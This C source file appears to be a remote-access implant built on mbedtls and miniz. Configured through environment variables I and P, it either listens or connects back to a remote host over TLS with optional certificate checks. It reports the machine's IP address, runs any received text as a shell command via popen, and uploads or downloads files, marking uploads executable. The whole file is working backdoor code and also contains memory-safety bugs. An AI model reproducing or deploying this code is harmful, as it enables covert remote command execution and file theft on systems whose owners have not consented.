#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <signal.h>
#include <poll.h>
#include <ifaddrs.h>

#include "mbedtls/entropy.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/certs.h"
#include "mbedtls/x509.h"
#include "mbedtls/ssl.h"
#include "mbedtls/net.h"
#include "mbedtls/error.h"
#include "mbedtls/debug.h"
#include "mbedtls/ssl_internal.h"
#include "mbedtls/sha256.h"

//#include "zlib.h"
#include "miniz.c"

//#define PORT "5000"
#define BACKLOG 10
#define BUFFER_SIZE 16384

static void my_debug( void *ctx, int level, const char *file, int line, const char *str )
{
    ((void) level);

    fprintf( (FILE *) ctx, "%s:%04d: %s", file, line, str );
    fflush(  (FILE *) ctx  );
}

struct compression {
    unsigned char *orig_buffer;
    unsigned char *transformed_buffer;
    int orig_size;
    int transformed_size;
};

struct ssl_conn {
    mbedtls_net_context conn_fd;
    mbedtls_ssl_context ssl_fd;
    struct ssl_conn *next;
};

static void add_client(struct ssl_conn **head, struct ssl_conn **client_conn);
static void decompress_buffer(struct compression *compress);
static void compress_buffer(struct compression *compress);
static void callback_to_ip(struct compression *compress);
static void upload_file(struct compression *decompress, struct ssl_conn *client_conn);
static void download_file(struct compression *compress, struct ssl_conn *client_conn);
static void client_disconnect(struct ssl_conn **head, struct pollfd *fds, int fd, int *nfds);

int main() //int argc, char *argv[]){
{
    int i, ret;
    int had_output = 0;
    char *empty_return = "[*] Command completed\n";
    FILE *fp;
    char *env_host = NULL;
    char *env_port = NULL;

    struct pollfd fds[64];
    int    nfds = 1, current_size = 0;
    struct ssl_conn *listen_conn = NULL;
    struct ssl_conn *client_conn = NULL;
    struct ssl_conn *clean_helper = NULL;
    struct compression compress;
    struct ifaddrs *ifa = NULL;
    struct ifaddrs *tmp = NULL;
    struct sockaddr_in *pAddr = NULL;

    //mbedtls
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context ctr_drbg;
    mbedtls_ssl_config conf;
    mbedtls_x509_crt srvcert;
    mbedtls_pk_context pkey;
    mbedtls_x509_crt_init( &srvcert );
    mbedtls_pk_init( &pkey );
    mbedtls_entropy_init( &entropy );
    mbedtls_ctr_drbg_init( &ctr_drbg );
    mbedtls_ssl_config_init( &conf );

    env_host = getenv("I");
    env_port = getenv("P");

    if (env_port == NULL){
        return 17;
    }

    listen_conn = malloc (sizeof(struct ssl_conn));
    memset(listen_conn, 0, sizeof(struct ssl_conn));

    mbedtls_net_init( &listen_conn->conn_fd );
    mbedtls_ssl_init( &listen_conn->ssl_fd );
    printf("Host: %s\n", env_host);

    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_srv_crt, mbedtls_test_srv_crt_len );
    if( ret != 0 ) {
        printf( " failed\n  !  mbedtls_x509_crt_parse returned %d\n\n", ret );
        return 1;
    }

    ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_cas_pem, mbedtls_test_cas_pem_len );
    if( ret != 0 ) {
        printf( " failed\n  !  mbedtls_x509_crt_parse returned %d\n\n", ret );
        return 2;
    }

    ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) mbedtls_test_srv_key, mbedtls_test_srv_key_len, NULL, 0 );
    if( ret != 0 ) {
        printf( " failed\n  !  mbedtls_pk_parse_key returned %d\n\n", ret );
        return 3;
    }

    printf( "  . Seeding the random number generator..." );
    fflush( stdout );
    mbedtls_entropy_init(&entropy);
    if( ( ret = mbedtls_ctr_drbg_seed( &ctr_drbg, mbedtls_entropy_func, &entropy, NULL, 256 ) ) != 0 ) {
        printf( " failed\n  ! mbedtls_ctr_drbg_seed returned %d\n", ret );
        return 5;
    }
    printf(" ok\n");

    printf( "  . Setting up the SSL data...." );
    fflush( stdout );
    if (env_host == NULL){
        if( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_SERVER, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            return 6;
        }
    } else {
        if( ( ret = mbedtls_ssl_config_defaults( &conf, MBEDTLS_SSL_IS_CLIENT, MBEDTLS_SSL_TRANSPORT_STREAM, MBEDTLS_SSL_PRESET_DEFAULT ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_ssl_config_defaults returned %d\n\n", ret );
            return 6;
        }
        mbedtls_ssl_conf_authmode( &conf, MBEDTLS_SSL_VERIFY_OPTIONAL );
    }
    printf(" ok\n");    

    printf( "  . Setting up the SSL/TLS structure..." );
    fflush( stdout );
    mbedtls_ssl_conf_rng( &conf, mbedtls_ctr_drbg_random, &ctr_drbg );
    mbedtls_ssl_conf_dbg( &conf, my_debug, stdout );
    mbedtls_ssl_conf_ca_chain( &conf, srvcert.next, NULL );
    if( ( ret = mbedtls_ssl_conf_own_cert( &conf, &srvcert, &pkey ) ) != 0 ) {
        printf( " failed\n  ! mbedtls_ssl_conf_own_cert returned %d\n\n", ret );
        return 7;
    }

    printf( " ok\n" );

    if (env_host == NULL){
        if( ( ret = mbedtls_net_bind( &listen_conn->conn_fd, NULL, env_port, MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_net_bind returned %d\n\n", ret );
            return 4;
        }
    } else {
        if ( ( ret = mbedtls_ssl_setup( &listen_conn->ssl_fd, &conf ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_ssl_setup returned %d\n\n", ret );
            return 6;
        }

        printf("Connecting to tcp/%s/%s...\n", env_host, env_port);
        if ( ( ret = mbedtls_net_connect( &listen_conn->conn_fd, env_host, env_port, MBEDTLS_NET_PROTO_TCP ) ) != 0 ) {
            printf( " failed\n  ! mbedtls_net_connect returned %d\n\n", ret );
            return 4;
        }

        mbedtls_ssl_set_bio( &listen_conn->ssl_fd, &listen_conn->conn_fd, mbedtls_net_send, mbedtls_net_recv, NULL );

        printf( "  . Performing the SSL/TLS handshake..." );
        fflush( stdout );
        while ( ( ret = mbedtls_ssl_handshake( &listen_conn->ssl_fd ) ) != 0 ) {
            if ( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ) {
                printf( " failed\n  ! mbedtls_ssl_handshake returned -0x%x\n\n", -ret );
                return 8;
            }
        }
        printf( " ok\n" );

        getifaddrs(&ifa);
        tmp = ifa;
        pAddr = NULL;
        while (tmp) {
            if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
                if (strncmp(tmp->ifa_name, "lo", 2) != 0){
                    pAddr = (struct sockaddr_in *)tmp->ifa_addr;
                }
            }
            tmp = tmp->ifa_next;
        }
        if (pAddr != NULL){
            mbedtls_ssl_write(&listen_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
        } else{
            mbedtls_ssl_write(&listen_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
        }
        freeifaddrs(ifa);
    }

    memset(fds, -1, sizeof(fds));

    /*************************************************************/
    /* Set up the initial listening socket                        */
    /*************************************************************/
    fds[0].fd = listen_conn->conn_fd.fd;
    fds[0].events = POLLIN;
    printf( "  . Waiting for a remote connection ..." );
    fflush( stdout );

    memset(&compress, 0, sizeof(struct compression));
    if ((compress.orig_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.orig_buffer, 0, BUFFER_SIZE);

    if ((compress.transformed_buffer = (unsigned char*) malloc(BUFFER_SIZE)) == NULL){
        perror("Failed initial malloc");
    }
    memset(compress.transformed_buffer, 0, BUFFER_SIZE);
    
    while (1) {
        ret = poll(fds, nfds, -1);
        if (ret < 0) {
            perror("  poll() failed");
            goto Cleanup;
        }
        /***********************************************************/
        /* One or more descriptors are readable.  Need to          */
        /* determine which ones they are.                          */
        /***********************************************************/
        current_size = nfds;

        //Run through the existing connection looking for data to be read
        for (i = 0; i < current_size; i++) {
            //New connection
            if (fds[i].revents & POLLIN) {
                if ((fds[i].fd == listen_conn->conn_fd.fd) && (env_host == NULL)) {
                    /*******************************************************/
                    /* Listening descriptor is readable.                   */
                    /*******************************************************/

                    /* Creates a node at the end of the list */
                    add_client(&listen_conn, &client_conn);

                    if( ( ret = mbedtls_net_accept( &listen_conn->conn_fd, &client_conn->conn_fd, NULL, 0, NULL ) ) != 0 ) {
                        printf( " failed\n  ! mbedtls_net_accept returned %d\n\n", ret );
                        return 9;
                    } else {
                        printf(" connected!\n");
                        if( ( ret = mbedtls_ctr_drbg_reseed( &ctr_drbg, NULL, 0 ) ) != 0 ) {
                            printf( " failed\n  ! mbedtls_ctr_drbg_reseed returned %d\n", ret );
                            goto Cleanup;
                        }

                        if( ( ret = mbedtls_ssl_setup( &client_conn->ssl_fd, &conf ) ) != 0 ) {
                            printf( " failed\n  ! mbedtls_ssl_setup returned %d\n\n", ret );
                            return 8;
                        }
                        printf("  . mbedtls_ssl_setup ... completed\n");
                        mbedtls_ssl_set_bio( &client_conn->ssl_fd, &client_conn->conn_fd, mbedtls_net_send, mbedtls_net_recv, 0 );

                        //Handle new connections
                        printf( "  . Performing the SSL/TLS handshake ..." );
                        fflush( stdout );

                        while( ( ret = mbedtls_ssl_handshake( &client_conn->ssl_fd ) ) != 0 ) {
                            if( ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE ) {
                                printf( " failed\n  ! mbedtls_ssl_handshake returned 0x%x\n\n", -ret );
                                return 10;
                            }
                        }
                        printf(" ok\n");
                        printf("Cipher: %s\n", mbedtls_ssl_get_ciphersuite( &client_conn->ssl_fd ));
                        
                        getifaddrs(&ifa);
                        tmp = ifa;
                        pAddr = NULL;
                        while (tmp) {
                            if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
                                if (strncmp(tmp->ifa_name, "lo", 2) != 0){
                                    pAddr = (struct sockaddr_in *)tmp->ifa_addr;
                                }
                            }
                            tmp = tmp->ifa_next;
                        }
                        if (pAddr != NULL){
                            mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
                        } else{
                            mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)inet_ntoa(pAddr->sin_addr), sizeof(unsigned char) * strnlen(inet_ntoa(pAddr->sin_addr), 17));
                        }
                        freeifaddrs(ifa);

                        /*****************************************************/
                        /* Add the new incoming connection to the            */
                        /* pollfd structure                                  */
                        /*****************************************************/
                        printf("%s: New connection from %s on socket %d\n", "127.0.0.1", "127.0.0.1", client_conn->conn_fd.fd);
                        fds[nfds].fd = client_conn->conn_fd.fd;
                        fds[nfds].events = POLLIN;
                        nfds++;
                    }
                } else {
                    //Handle data from a client
                    /*******************************************************/
                    /* Receive all incoming data on this socket            */
                    /* before we loop back and call poll again.            */
                    /*******************************************************/
                    client_conn = listen_conn->next;
                    while (client_conn != NULL) {
                        if (client_conn->conn_fd.fd == fds[i].fd) {
                            break;
                        }
                        client_conn = client_conn->next;
                    }
                    if (env_host != NULL){
                        client_conn = listen_conn;
                    }

                    /*****************************************************/
                    /* Receive data on this connection until the         */
                    /* recv fails with EWOULDBLOCK. If any other         */
                    /* failure occurs, we will close the                 */
                    /* connection.                                       */
                    /*****************************************************/
                    if ((compress.orig_size = mbedtls_ssl_read(&client_conn->ssl_fd, compress.orig_buffer, BUFFER_SIZE)) <= 0){
                        printf("nbytes: %d\n", compress.orig_size);
                        //Got an error or connection closed by client
                        if (compress.orig_size == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
                            //Connection closed
                            printf("%s: socket %d hung up\n", "127.0.0.1", i);
                            goto Cleanup;
                        }
                        if (compress.orig_size == MBEDTLS_ERR_NET_RECV_FAILED) {
                            printf("MBEDTLS recv failed\n");
                            goto Cleanup;
                        }

                        if (compress.orig_size == 0) {
                            printf("Connection closed\n");
                            if (env_host != NULL){
                                goto Cleanup;
                            }
                            client_disconnect(&listen_conn, &fds[i], fds[i].fd, &nfds);
                            continue;
                        }
                    } else {
                        decompress_buffer(&compress);
                        printf("Decompressed: %s\n", compress.transformed_buffer);

                        if (strncmp("", (char*)compress.transformed_buffer, 1) == 0) {
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                            compress_buffer(&compress);
                            if (mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1 ) {
                                perror("Error Sending");
                            }
                            continue;
                        }
                        if (strncmp(".kill", (char*)compress.transformed_buffer, 5) == 0) {
                            printf("Exiting...\n");
                            goto Cleanup;
                        }

                        if (strncmp(".quit", (char*)compress.transformed_buffer, 5) == 0) {
                            printf("Exiting...\n");
                            client_disconnect(&listen_conn, &fds[i], fds[i].fd, &nfds);
                            continue;
                        }

                        if (strncmp("call ", (char*)compress.transformed_buffer, 5) == 0){
                            //callback_to_ip((char*)compress.transformed_buffer, &client_conn);
                            continue;
                        }

                        if (strncmp("upload ", (char*)compress.transformed_buffer, 7) == 0) {
                            strncpy((char*)compress.orig_buffer, (char*)compress.transformed_buffer, BUFFER_SIZE);
                            upload_file(&compress, client_conn);
                            continue;
                        }

                        if (strncmp("download ", (char*)compress.transformed_buffer, 9) == 0) {
                            strncpy((char*)compress.orig_buffer, (char*)compress.transformed_buffer, BUFFER_SIZE);
                            download_file(&compress, client_conn);
                            continue;
                        }

                        fp = popen(strncat((char*)compress.transformed_buffer, " 2>&1 ", 6), "r");
                        if (fp == NULL) {
                            printf("Failed to run command\n");
                        }

                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                        while ((compress.orig_size = fread((char*)compress.orig_buffer, 1, BUFFER_SIZE, fp)) > 0) {
                            printf("%s", compress.orig_buffer);
                            compress_buffer(&compress);
                            ret = mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size);
                            memset(compress.orig_buffer, 0, BUFFER_SIZE);
                            memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                            had_output = 1;
                        }
                        if (compress.orig_size == 0 && had_output == 0) {
                            strncpy((char*)compress.orig_buffer, empty_return, BUFFER_SIZE);
                            compress_buffer(&compress);
                            if (mbedtls_ssl_write(&client_conn->ssl_fd, compress.transformed_buffer, compress.transformed_size) == -1) {
                                perror("Error Sending");
                            }
                        }
                        had_output = 0;

                        fclose(fp);
                        memset(compress.orig_buffer, 0, BUFFER_SIZE);
                        memset(compress.transformed_buffer, 0, BUFFER_SIZE);
                    }
                }
            }
        } // end of loop through pollable descriptors
    } //while loop

Cleanup:
    /*************************************************************/
    /* Clean up all of the sockets that are open
    *************************************************************/

    for (i = 0; i < nfds; i++) {
        if (fds[i].fd >= 0) {
            close(fds[i].fd);
        }
    }

    free(compress.orig_buffer);
    free(compress.transformed_buffer);
    client_conn = listen_conn->next;
    while (client_conn != NULL) {
        clean_helper = client_conn;
        mbedtls_ssl_free( &client_conn->ssl_fd );
        mbedtls_net_free( &client_conn->conn_fd );
        client_conn = client_conn->next;
        free(clean_helper);
    }
    mbedtls_ssl_free( &listen_conn->ssl_fd );
    mbedtls_net_free( &listen_conn->conn_fd );
    free(listen_conn);

    mbedtls_x509_crt_free( &srvcert );
    mbedtls_pk_free( &pkey );
    mbedtls_ssl_config_free( &conf );
    mbedtls_ctr_drbg_free( &ctr_drbg );
    mbedtls_entropy_free( &entropy );

    return 0;
}

static void add_client(struct ssl_conn **head, struct ssl_conn **client_conn)
{
    struct ssl_conn *current = *head;
    *client_conn = (struct ssl_conn*)malloc (sizeof(struct ssl_conn));
    if (client_conn == NULL) {
        perror("Failed client malloc");
    }
    memset((*client_conn), 0, sizeof(struct ssl_conn));
    mbedtls_net_init( &(*client_conn)->conn_fd );
    mbedtls_ssl_init( &(*client_conn)->ssl_fd );
    (*client_conn)->next = NULL;

    if ((*head)->next == NULL) {
        (*head)->next = *client_conn;
        //printf("added at beginning\n");
    } else {
        while (current->next != NULL) {
            current = current->next;
            //printf("added later\n");
        }
        current->next = *client_conn;
    }
    return;
}

static void decompress_buffer(struct compression *decompress)
{
    z_stream infstream;
    infstream.zalloc = Z_NULL;
    infstream.zfree = Z_NULL;
    infstream.opaque = Z_NULL;
    infstream.avail_in = (uInt)decompress->orig_size;
    infstream.next_in = (Bytef *)decompress->orig_buffer;
    infstream.avail_out = (uInt)BUFFER_SIZE;
    infstream.next_out = (Bytef *)decompress->transformed_buffer;

    inflateInit(&infstream);
    inflate(&infstream, Z_NO_FLUSH);
    inflateEnd(&infstream);

    decompress->transformed_size = infstream.total_out;
}

static void compress_buffer(struct compression *compress)
{
    z_stream defstream;
    defstream.zalloc = Z_NULL;
    defstream.zfree = Z_NULL;
    defstream.opaque = Z_NULL;
    defstream.avail_in = (uInt)compress->orig_size;
    defstream.next_in = (Bytef *)compress->orig_buffer;
    defstream.avail_out = (uInt)BUFFER_SIZE;
    defstream.next_out = (Bytef *)compress->transformed_buffer;

    if (Z_OK != deflateInit(&defstream, Z_DEFAULT_COMPRESSION)) {
        printf("Error compressing\n");
        return;
    }
    deflate(&defstream, Z_FINISH);
    deflateEnd(&defstream);
    compress->transformed_size = defstream.total_out;
}

static void upload_file(struct compression* decompress, struct ssl_conn* client_conn)
{
    size_t file_size = 0, size_recv = 0 ;
    FILE* remote_file;
    char *first_file = NULL, *second_file = NULL, *command_start = NULL;
    char *command = malloc(BUFFER_SIZE);
    unsigned int remain_data = 0;
    unsigned char sha1_output[32];
    unsigned int j;
    mbedtls_sha256_context file_hash;

    memset(command, 0, BUFFER_SIZE);
    command_start = strncpy(command, (char*)decompress->orig_buffer, BUFFER_SIZE);
    strsep(&command, " ");
    first_file = strsep(&command, " ");
    second_file = strsep(&command, " ");
    printf("File upload: %s -> %s\n", first_file, second_file);

    remote_file = fopen(second_file, "wb");
    if (remote_file == NULL) {
        fprintf(stderr, "Failed to open file foo --> %s\n", strerror(errno));
        exit(-1);
    }

    file_size = 0;
    size_recv = 0;
    if ((size_recv = mbedtls_ssl_read(&client_conn->ssl_fd, (unsigned char*) &file_size, sizeof(size_t))) > 0) {
        if (size_recv == (unsigned int)-1) {
            perror("Error recving");
        }
    }
    printf("File size %zd\n", file_size);

    //Initialize SHA1 hash
    mbedtls_sha256_init(&file_hash);
    mbedtls_sha256_starts(&file_hash, 0);

    remain_data = 0;
    memset(decompress->transformed_buffer, 0, BUFFER_SIZE); 
    memset(decompress->orig_buffer, 0, BUFFER_SIZE); 
    while (((decompress->orig_size = mbedtls_ssl_read(&client_conn->ssl_fd, decompress->orig_buffer, BUFFER_SIZE)) > 0) || (remain_data < file_size)) {
        decompress_buffer(decompress);
        mbedtls_sha256_update(&file_hash, decompress->transformed_buffer, decompress->transformed_size);
        remain_data += fwrite(decompress->transformed_buffer, 1, decompress->transformed_size, remote_file);
        fprintf(stdout, "Received %d bytes out of %d bytes\n", decompress->transformed_size, (int)file_size);
        memset(decompress->orig_buffer, 0, BUFFER_SIZE); 
        memset(decompress->transformed_buffer, 0, BUFFER_SIZE); 
        if (remain_data == file_size) {
            break;
        }
    }
    printf("Finished writing file %s\n", second_file);

    //Hash check
    mbedtls_sha256_finish(&file_hash, sha1_output);
    printf("\nSha1 hash: ");
    for (j = 0; j < sizeof(sha1_output); j++) {
        printf("%02x", sha1_output[j]);
    }
    printf("\n");

    if (mbedtls_ssl_write(&client_conn->ssl_fd, sha1_output, sizeof(sha1_output)) < 0) {
        printf("Error sending SHA1 hash\n");
    }

    printf("Changing permissions to 700\n");
    if (chmod(second_file, S_IRWXU) == -1) {
        printf("Unable to chmod\n");
    }

    free(command_start);
    fclose(remote_file);

    return;
}

static void download_file(struct compression* compress, struct ssl_conn* client_conn)
{
    int fd = 0;
    size_t file_size = 0, sent_bytes = 0, total_sent = 0;
    FILE* remote_file = NULL;
    char *first_file = NULL, *second_file = NULL, *command_start = NULL;
    char *command = malloc(BUFFER_SIZE);
    unsigned int remain_data = 0;
    unsigned char sha1_output[32];
    unsigned int i = 0;
    struct stat st;
    mbedtls_sha256_context file_hash;

    memset(command, 0, BUFFER_SIZE);
    command_start = strncpy(command, (char*)compress->orig_buffer, BUFFER_SIZE);
    if (strsep(&command, " ") == NULL){
        perror("Error parsing download");
    }
    first_file = strsep(&command, " ");
    second_file = strsep(&command, " ");
    printf("File download: %s -> %s\n", first_file, second_file);

    memset(compress->orig_buffer, 0, BUFFER_SIZE);
    memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    if (access(first_file, F_OK) == -1) {
        printf("File not found\n");
        if ( mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
            printf("Error: %s", strerror(errno));
            return;
        }
        strncpy((char*)compress->orig_buffer, "File doesn't exist", BUFFER_SIZE);
        compress_buffer(compress);
        mbedtls_ssl_write(&client_conn->ssl_fd, compress->transformed_buffer, compress->transformed_size);
        free(command_start);
        return;
    }
    if (access(first_file, R_OK) == -1) {
        if ( mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
            printf("Error: %s", strerror(errno));
            return;
        }
        strncpy((char*)compress->orig_buffer, "Insufficient permissions", BUFFER_SIZE);
        compress_buffer(compress);
        mbedtls_ssl_write(&client_conn->ssl_fd, compress->transformed_buffer, compress->transformed_size);
        free(command_start);
        return;
    }

    //Get local file size
    memset(&st, 0, sizeof(struct stat));
    if (stat(first_file, &st) == -1) {
        perror("stat error");
    }

    //Get the file size
    file_size = st.st_size;
    printf("File size %zd\n", file_size);

    if (file_size == 0){
        if ( mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
            printf("Error: %s", strerror(errno));
            return;
        }
        strncpy((char*)compress->orig_buffer, "Zero byte file", BUFFER_SIZE);
        compress_buffer(compress);
        mbedtls_ssl_write(&client_conn->ssl_fd, compress->transformed_buffer, compress->transformed_size);
        free(command_start);
        return;
    }

    remote_file = fopen(first_file, "rb");
    if (remote_file == NULL) {
        fprintf(stderr, "Failed to open file foo --> %s\n", strerror(errno));
        exit(-1);
    }

    fd = fileno(remote_file);
    if (fd == -1) {
        perror("Unable to get fileno");
    }

    //Send file size for the other side to receive
    if ( mbedtls_ssl_write(&client_conn->ssl_fd, (unsigned char*)&file_size, sizeof(file_size)) == -1 ) {
        printf("Error: %s", strerror(errno));
        return;
    }

    remain_data = file_size;
    sent_bytes = 0;
    total_sent = 0;

    //Initialize for SHA256 hash
    mbedtls_sha256_init(&file_hash);
    mbedtls_sha256_starts(&file_hash, 0);

    memset(compress->orig_buffer, 0, BUFFER_SIZE);
    memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    compress->orig_size = 0;
    compress->transformed_size = 0;
    // Sending file data
    while ((compress->orig_size = fread((char*) compress->orig_buffer, 1, BUFFER_SIZE, remote_file)) > 0) {
        mbedtls_sha256_update(&file_hash, compress->orig_buffer, compress->orig_size);
        compress_buffer(compress);
        sent_bytes = mbedtls_ssl_write(&client_conn->ssl_fd, compress->transformed_buffer, compress->transformed_size);
        fprintf(stdout, "Sent %zu bytes from file's data, remaining data = %d\n", sent_bytes, remain_data);
        total_sent += compress->orig_size;
        remain_data -= compress->orig_size;
        memset(compress->orig_buffer, 0, BUFFER_SIZE);
        memset(compress->transformed_buffer, 0, BUFFER_SIZE);
    }

    if (total_sent < file_size) {
        fprintf(stderr, "incomplete transfer from sendfile: %zu of %zu bytes\n", total_sent, file_size);
    } else {
        printf("Finished transferring %s\n", first_file);
    }

    mbedtls_sha256_finish(&file_hash, sha1_output);
    printf("\nSHA1 hash: ");
    for (i = 0; i < sizeof(sha1_output); i++) {
        printf("%02x", sha1_output[i]);
    }
    printf("\n");

    if (mbedtls_ssl_write(&client_conn->ssl_fd, sha1_output, sizeof(sha1_output)) < 0) {
        printf("Error recving Sha1 hash\n");
    }

    mbedtls_sha256_free(&file_hash);
    fclose(remote_file);
    free(command_start);

    return;
}

static void client_disconnect(struct ssl_conn **head, struct pollfd *fds, int fd, int *nfds)
{
    struct ssl_conn *current = (*head)->next;
    struct ssl_conn *previous = *head;
    while (current != NULL && previous != NULL) {
        if (current->conn_fd.fd == fd) {
            close(fds->fd);
            fds->fd = (fds+1)->fd;
            (*nfds)--;
            previous->next = current->next;
            mbedtls_ssl_free(&current->ssl_fd);
            mbedtls_net_free(&current->conn_fd);
            free(current);
            return;
        }
        previous = current;
        current = current->next;
    }
    return;
}
